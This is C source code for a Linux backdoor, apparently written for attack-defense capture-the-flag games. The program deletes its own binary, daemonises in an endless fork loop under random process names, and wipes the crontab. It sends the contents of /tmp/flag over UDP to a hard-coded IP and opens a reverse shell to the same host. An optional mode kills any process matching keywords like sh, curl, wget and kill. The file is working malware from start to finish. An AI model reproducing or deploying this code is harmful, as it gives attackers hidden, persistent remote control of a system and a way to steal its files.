#include<unistd.h>
#include<sys/mman.h>
#include<stdio.h>
#include<stdlib.h>
#include<sys/prctl.h>
#include<time.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>

#define INTERVAL 20

#if BKDOOR_NUM == 0
#define FLAG_PATH "/tmp/flag"
#elif BKDOOR_NUM == 1
#define FLAG_PATH "/tmp/flag"
#endif

#define FLAG_SERVER_PORT 10001

#define FLAG_SERVER_IP "192.168.43.105"

#define SHELL_SERVER_IP "192.168.43.105"
#define SHELL_SERVER_PORT 8787

void daemonlize()
{
    umask(0);
    if(fork() > 0)
    {
        exit(0);
    }
    setsid();
}

char * get_name(char * argv0)
{
    unsigned char namelen = 0;
    int fd = open("/dev/urandom", 0);
    read(fd, &namelen, 1);
    namelen &= 0xF;
    read(fd, argv0, namelen);
    argv0[namelen] = 0;
    close(fd);
    return argv0;
}

extern char **environ;

void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;

    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer

    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * strlen(envp[i]));
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;
}

void sendUdp(char * flag, const char *ip, int port)
{
    struct sockaddr_in server;
    int sockfd, len = 0;   
    int server_len = sizeof(struct sockaddr_in);     
     
    /* setup a socket，attention: must be SOCK_DGRAM */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);

    /*complete the struct: sockaddr_in*/
    bzero(&server, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);
    sendto(sockfd, flag,  strlen(flag), 0, (struct sockaddr *)&server, server_len);
    close(sockfd);
}

void post_flag()
{
    char buff[255] = {0};
    /*
    FILE * fd = popen("/usr/bin/getflag", "r");
    int i=0;
    do
    {
        int ch = fgetc(fd);
        buff[i++] = ch;
        if(ch == '\n')
            break;
    }while(!feof(fd));
    fclose(fd);*/
    FILE * fp = fopen(FLAG_PATH,"r");
    if(!fp)
        return;
#if defined(BKDOOR_NUM)
    buff[0] = BKDOOR_NUM + '0';
    buff[1] = '@';
    fgets(buff+2, 253, fp);
#else
    fgets(buff, 255, fp);
#endif
    fclose(fp);
    
    sendUdp(buff, FLAG_SERVER_IP, FLAG_SERVER_PORT);
}

void reverse_shell()
{
    if(fork() > 0)
        return;
    
    int sockfd = 0;
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
#if defined(BKDOOR_NUM)
    srv_addr.sin_port = htons(SHELL_SERVER_PORT + BKDOOR_NUM);
#else
    srv_addr.sin_port = htons(SHELL_SERVER_PORT);
#endif
    srv_addr.sin_addr.s_addr = inet_addr(SHELL_SERVER_IP);

    sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);

    if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) != 0)
    {
        exit(0);
    }
    
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);
    char *const params[] = {"/bin/sh", NULL};
    char *const environ[] = {NULL};
    execve("/bin/sh", params, environ);
}

void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    int len = read(fd, path, sizeof(path));
    close(fd);
    //如果在结尾'\0'前还有'\0'，说明是使用ld.so ./programe形式执行
    int i = 0;
    for(;i < len - 1;++i)
    {
        if(path[i] == '\0')
        {
            unlink(path + i + 1);
            return;
        }
    }
    unlink(path);
}

void clear_crontab()
{
    if(fork() > 0)
        return;
    
    char *const params[] = {"/usr/bin/crontab", "-r", NULL};
    char *const environ[] = {NULL};
    execve("/usr/bin/crontab", params, environ);
}

int is_need_kill(const char * cmdline)
{
    char * keywords[] = {"sh", "curl", "cat", "wget", "printf", "echo", "scp", "chmod", "crontab", "kill"};
    int i = 0;
    for(; i < sizeof(keywords)/sizeof(char *); ++i)
    {
        char * ptr = strstr(cmdline, keywords[i]);
        if(ptr != NULL)
        {
            return 1;
        }
    }
    //printf("%s no need kill\n", cmdline);
    return 0;
}

void travel_proc_kill()
{
    DIR *d = 0;
    struct dirent *file = 0;
    
    if(!(d = opendir("/proc")))
    {
        //printf("no privilege\n");
        return;
    }
    while((file = readdir(d)) != NULL)
    {
        if(strncmp(file->d_name, ".", 1) == 0 || strncmp(file->d_name, "..", 2) == 0)
            continue;
        //判断该文件是否是目录
        if(file->d_type & DT_DIR)
        {
            const char * dirname = file->d_name;
            if(isdigit(dirname[0]))//数字才是pid目录
            {
                char path[255] = {0};
                sprintf(path, "/proc/%s/cmdline", dirname);
                int fd = open(path, 0);
                if(fd != -1)
                {
                    char buff[255] = {0};
                    int len = read(fd, buff, sizeof(buff));
                    if(is_need_kill(buff) && len > 0)
                    {
                        int pid = atoi(dirname);
                        if(pid != getpid())//防止自杀
                            kill(pid, 9);
                    }
                    close(fd);
                }
            }
        }
    }
    closedir(d);
}

int g_timer = 0;
//#define CLEAN_BKDOOR
int main(int argc, char *argv[]/*, char * env[]*/)
{   
    self_delete();
    setproctitle_init(argc, argv, environ);

new_child:
    daemonlize();
    
    char * name = get_name(argv[0]);
    prctl(PR_SET_NAME, name); 
    //do job
    ++g_timer;
    
    if(g_timer == 1000)//当前周期是2-3秒
    {
        g_timer = 0;
        post_flag();
    #if !defined(CLEAN_BKDOOR)
        reverse_shell();
    #endif
    }
    
    clear_crontab();
#if defined(CLEAN_BKDOOR)
    //kill(-1, 9);
    travel_proc_kill();
#endif    
    usleep(INTERVAL);
    goto new_child;
    return 0;
}
 
